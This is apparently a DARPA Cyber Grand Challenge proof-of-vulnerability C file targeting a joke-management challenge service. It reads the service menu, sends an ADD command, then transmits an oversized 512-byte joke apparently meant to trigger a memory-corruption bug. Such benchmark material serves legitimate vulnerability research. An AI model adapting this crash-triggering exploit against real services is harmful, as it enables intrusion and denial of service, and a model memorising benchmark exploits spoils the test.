#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   //*** delay
   cgc_delay(15);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x54\x68\x69\x73\x20\x69\x73\x20\x74\x68\x65\x20\x43\x68\x75\x63"
         "\x6b\x20\x4e\x6f\x72\x72\x69\x73\x20\x28\x6a\x6f\x6b\x65\x29\x20"
         "\x4d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x20\x50\x72\x6f\x74\x6f"
         "\x63\x6f\x6c\x20\x28\x43\x4e\x4d\x50\x29\x2e\x0a";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 60);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 1);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x57\x65\x20\x6b\x6e\x6f\x77\x20\x79\x6f\x75\x20\x6e\x65\x65\x64"
         "\x20\x61\x20\x62\x72\x65\x61\x6b\x2c\x20\x73\x6f\x20\x74\x61\x6b"
         "\x65\x20\x73\x6f\x6d\x65\x20\x74\x69\x6d\x65\x20\x61\x6e\x64\x20"
         "\x61\x6d\x75\x73\x65\x20\x79\x6f\x75\x72\x73\x65\x6c\x66\x2e\x20"
         "\x49\x66\x20\x79\x6f\x75\x20\x68\x61\x76\x65\x20\x61\x20\x67\x6f"
         "\x6f\x64\x20\x43\x68\x75\x63\x6b\x20\x4e\x6f\x72\x72\x69\x73\x20"
         "\x6a\x6f\x6b\x65\x2c\x20\x79\x6f\x75\x20\x63\x61\x6e\x20\x61\x64"
         "\x64\x20\x69\x74\x20\x74\x6f\x20\x6f\x75\x72\x20\x6c\x69\x73\x74"
         "\x69\x6e\x67\x2e\x0a";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 133);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 1);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x45\x6e\x74\x65\x72\x20\x6f\x6e\x65\x20\x6f\x66\x20\x74\x68\x65"
         "\x73\x65\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x73\x3a\x0a";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 29);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 1);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x20\x20\x4c\x49\x53\x54\x20\x20\x2d\x20\x6c\x69\x73\x74\x20\x61"
         "\x6c\x6c\x20\x6a\x6f\x6b\x65\x73\x0a";
      read_00003_ptr += cgc_data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 25);
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 1);
      if (read_00004_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00004_00000[] = 
         "\x20\x20\x41\x44\x44\x20\x20\x20\x2d\x20\x75\x70\x6c\x6f\x61\x64"
         "\x20\x79\x6f\x75\x72\x20\x6f\x77\x6e\x20\x6a\x6f\x6b\x65\x0a";
      read_00004_ptr += cgc_data_match(read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, match_00004_00000, 31);
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 1);
      if (read_00005_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00005_00000[] = 
         "\x20\x20\x43\x4f\x55\x4e\x54\x20\x2d\x20\x66\x69\x6e\x64\x20\x6f"
         "\x75\x74\x20\x68\x6f\x77\x20\x6d\x61\x6e\x79\x20\x6a\x6f\x6b\x65"
         "\x73\x20\x77\x65\x20\x68\x61\x76\x65\x20\x74\x6f\x20\x6f\x66\x66"
         "\x65\x72\x20\x79\x6f\x75\x0a";
      read_00005_ptr += cgc_data_match(read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, match_00005_00000, 55);
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** delimited read
      static unsigned char read_00006_delim[] = 
         "\x0a";
      read_00006 = NULL;
      read_00006_len = 0;
      int read_00006_res = cgc_delimited_read(0, &read_00006, &read_00006_len, read_00006_delim, 1);
      if (read_00006_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00006_00000[] = 
         "\x20\x20\x53\x48\x4f\x57\x20\x20\x2d\x20\x73\x68\x6f\x77\x20\x61"
         "\x20\x6a\x6f\x6b\x65\x0a";
      read_00006_ptr += cgc_data_match(read_00006 + read_00006_ptr, read_00006_len - read_00006_ptr, match_00006_00000, 22);
      cgc_free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** delimited read
      static unsigned char read_00007_delim[] = 
         "\x0a";
      read_00007 = NULL;
      read_00007_len = 0;
      int read_00007_res = cgc_delimited_read(0, &read_00007, &read_00007_len, read_00007_delim, 1);
      if (read_00007_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00007_00000[] = 
         "\x20\x20\x4d\x45\x4e\x55\x20\x20\x2d\x20\x64\x69\x73\x70\x6c\x61"
         "\x79\x20\x74\x68\x69\x73\x20\x6d\x65\x6e\x75\x0a";
      read_00007_ptr += cgc_data_match(read_00007 + read_00007_ptr, read_00007_len - read_00007_ptr, match_00007_00000, 28);
      cgc_free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** delimited read
      static unsigned char read_00008_delim[] = 
         "\x0a";
      read_00008 = NULL;
      read_00008_len = 0;
      int read_00008_res = cgc_delimited_read(0, &read_00008, &read_00008_len, read_00008_delim, 1);
      if (read_00008_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00008_00000[] = 
         "\x20\x20\x48\x45\x4c\x50\x20\x20\x2d\x20\x79\x6f\x75\x20\x67\x6f"
         "\x74\x74\x61\x20\x62\x65\x20\x6b\x69\x64\x69\x64\x69\x6e\x27\x20"
         "\x6d\x65\x21\x0a";
      read_00008_ptr += cgc_data_match(read_00008 + read_00008_ptr, read_00008_len - read_00008_ptr, match_00008_00000, 36);
      cgc_free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** delimited read
      static unsigned char read_00009_delim[] = 
         "\x0a";
      read_00009 = NULL;
      read_00009_len = 0;
      int read_00009_res = cgc_delimited_read(0, &read_00009, &read_00009_len, read_00009_delim, 1);
      if (read_00009_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00009_00000[] = 
         "\x20\x20\x51\x55\x49\x54\x20\x20\x2d\x20\x74\x61\x6b\x65\x20\x6f"
         "\x66\x66\x20\x65\x68\x3f\x0a";
      read_00009_ptr += cgc_data_match(read_00009 + read_00009_ptr, read_00009_len - read_00009_ptr, match_00009_00000, 23);
      cgc_free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** delimited read
      static unsigned char read_00010_delim[] = 
         "\x20";
      read_00010 = NULL;
      read_00010_len = 0;
      int read_00010_res = cgc_delimited_read(0, &read_00010, &read_00010_len, read_00010_delim, 1);
      if (read_00010_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00010_00000[] = 
         "\x3e\x20";
      read_00010_ptr += cgc_data_match(read_00010 + read_00010_ptr, read_00010_len - read_00010_ptr, match_00010_00000, 2);
      cgc_free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   //*** delay
   cgc_delay(10);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x41\x44\x44\x07";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   //*** delay
   cgc_delay(10);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** delimited read
      static unsigned char read_00011_delim[] = 
         "\x0a";
      read_00011 = NULL;
      read_00011_len = 0;
      int read_00011_res = cgc_delimited_read(0, &read_00011, &read_00011_len, read_00011_delim, 1);
      if (read_00011_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00011_00000[] = 
         "\x53\x6f\x2c\x20\x79\x6f\x75\x20\x74\x68\x69\x6e\x6b\x20\x79\x6f"
         "\x75\x20\x68\x61\x76\x65\x20\x61\x20\x67\x6f\x6f\x64\x20\x43\x68"
         "\x75\x63\x6b\x20\x4e\x6f\x72\x72\x69\x73\x20\x6a\x6f\x6b\x65\x3f"
         "\x20\x47\x69\x76\x65\x20\x6d\x65\x20\x74\x68\x65\x20\x6a\x6f\x6b"
         "\x65\x20\x73\x74\x72\x69\x6e\x67\x20\x61\x6c\x72\x65\x61\x64\x79"
         "\x2e\x2e\x2e\x2e\x0a";
      read_00011_ptr += cgc_data_match(read_00011 + read_00011_ptr, read_00011_len - read_00011_ptr, match_00011_00000, 85);
      cgc_free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** delimited read
      static unsigned char read_00012_delim[] = 
         "\x20";
      read_00012 = NULL;
      read_00012_len = 0;
      int read_00012_res = cgc_delimited_read(0, &read_00012, &read_00012_len, read_00012_delim, 1);
      if (read_00012_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00012_00000[] = 
         "\x41\x44\x44\x3e\x20";
      read_00012_ptr += cgc_data_match(read_00012 + read_00012_ptr, read_00012_len - read_00012_ptr, match_00012_00000, 5);
      cgc_free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   //*** delay
   cgc_delay(10);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x4f\x6e\x63\x65\x20\x75\x70\x6f\x6e\x20\x61\x20\x74\x69\x6d\x65"
         "\x20\x74\x68\x65\x72\x65\x20\x77\x61\x73\x20\x61\x20\x67\x75\x79"
         "\x20\x6e\x61\x6d\x65\x64\x20\x43\x68\x75\x63\x6b\x2c\x20\x43\x68"
         "\x75\x63\x6b\x20\x4e\x6f\x72\x72\x69\x73\x20\x74\x6f\x20\x62\x65"
         "\x20\x70\x72\x65\x63\x69\x73\x65\x2e\x20\x48\x65\x20\x77\x61\x73"
         "\x20\x61\x6c\x6c\x20\x70\x6f\x77\x65\x72\x66\x75\x6c\x2c\x20\x73"
         "\x6f\x20\x77\x61\x73\x20\x6e\x65\x76\x65\x72\x20\x62\x65\x61\x74"
         "\x65\x6e\x2e\x20\x31\x30\x30\x7e\x63\x20\x6f\x66\x20\x74\x68\x65"
         "\x20\x70\x65\x6f\x70\x6c\x65\x20\x74\x68\x61\x74\x20\x63\x68\x61"
         "\x6c\x6c\x65\x6e\x67\x65\x64\x20\x68\x69\x6d\x20\x77\x65\x72\x65"
         "\x20\x64\x65\x66\x65\x61\x74\x65\x64\x2e\x20\x48\x65\x20\x77\x61"
         "\x73\x20\x61\x6c\x6c\x20\x6b\x6e\x6f\x77\x69\x6e\x67\x2c\x20\x73"
         "\x6f\x20\x77\x61\x73\x20\x6e\x65\x76\x65\x72\x20\x63\x61\x75\x67"
         "\x68\x74\x20\x6f\x66\x66\x2d\x67\x75\x61\x72\x64\x2e\x20\x57\x68"
         "\x65\x6e\x20\x61\x20\x6e\x6f\x72\x6d\x61\x6c\x20\x68\x75\x6d\x61"
         "\x6e\x20\x77\x61\x73\x20\x63\x6f\x6e\x74\x72\x6f\x6c\x6c\x65\x64"
         "\x20\x62\x79\x20\x61\x20\x66\x6f\x72\x63\x65\x20\x6f\x66\x20\x6e"
         "\x61\x74\x75\x72\x65\x2c\x20\x43\x68\x75\x63\x6b\x20\x4e\x6f\x72"
         "\x72\x69\x73\x20\x77\x61\x73\x20\x69\x6d\x6d\x75\x6e\x65\x20\x74"
         "\x6f\x20\x74\x68\x6f\x73\x65\x20\x63\x6f\x6e\x74\x72\x6f\x6c\x73"
         "\x2e\x20\x31\x30\x30\x7e\x63\x20\x6f\x66\x20\x74\x68\x65\x20\x66"
         "\x6f\x72\x63\x65\x73\x20\x74\x68\x61\x74\x20\x6e\x61\x74\x75\x72"
         "\x65\x20\x63\x6f\x75\x6c\x64\x20\x61\x6d\x61\x73\x73\x20\x77\x65"
         "\x72\x65\x20\x75\x6e\x61\x62\x6c\x65\x20\x74\x6f\x20\x63\x61\x75"
         "\x73\x65\x20\x61\x20\x72\x65\x61\x63\x74\x69\x6f\x6e\x20\x69\x6e"
         "\x20\x43\x68\x75\x63\x6b\x20\x4e\x6f\x72\x72\x69\x73\x2e\x20\x54"
         "\x68\x65\x20\x74\x68\x72\x75\x74\x68\x20\x6f\x66\x20\x74\x68\x65"
         "\x20\x6d\x61\x74\x74\x65\x72\x20\x69\x73\x2c\x20\x43\x68\x75\x63"
         "\x6b\x20\x4e\x6f\x72\x72\x69\x73\x20\x69\x73\x20\x6e\x6f\x74\x20"
         "\x6f\x6e\x6c\x79\x20\x69\x6e\x76\x69\x6e\x63\x69\x62\x6c\x65\x2c"
         "\x20\x68\x65\x20\x69\x73\x20\x69\x6d\x6d\x6f\x72\x74\x61\x6c\x2e"
         "\x20\x2d\x43\x68\x75\x63\x6b\x20\x4e\x6f\x72\x72\x69\x73\x2e\x07";
      static unsigned int write_00001_00000_len = 512;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   //*** delay
   cgc_delay(10);
}
